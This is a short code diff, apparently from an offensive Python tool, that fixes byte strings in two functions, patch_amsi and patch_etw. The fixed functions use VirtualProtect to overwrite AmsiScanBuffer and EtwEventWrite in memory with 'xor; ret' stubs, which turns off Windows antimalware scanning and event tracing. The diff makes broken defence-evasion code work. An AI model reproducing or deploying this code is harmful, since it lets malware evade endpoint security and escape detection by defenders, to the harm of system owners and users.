@@ -10,7 +10,7 @@ def patch_amsi():
         amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(
             amsi_dll, b"AmsiScanBuffer"
         )
-        patch = b"\x31\\c0\xc3"  # xor eax, eax; ret
+        patch = b"\x31\xc0\xc3"  # xor eax, eax; ret
         old_protect = ctypes.c_ulong()
         ctypes.windll.kernel32.VirtualProtect(
             amsi_scan_buffer, len(patch), 0x40, ctypes.byref(old_protect)
@@ -26,7 +26,7 @@ def patch_etw():
     try:
         ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
         etw_event_write = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
-        patch = b"\x48\x33\\c0\xc3"  # xor rax, rax; ret
+        patch = b"\x48\x33\xc0\xc3"  # xor rax, rax; ret
         old_protect = ctypes.c_ulong()
         ctypes.windll.kernel32.VirtualProtect(
             etw_event_write, len(patch), 0x40, ctypes.byref(old_protect)
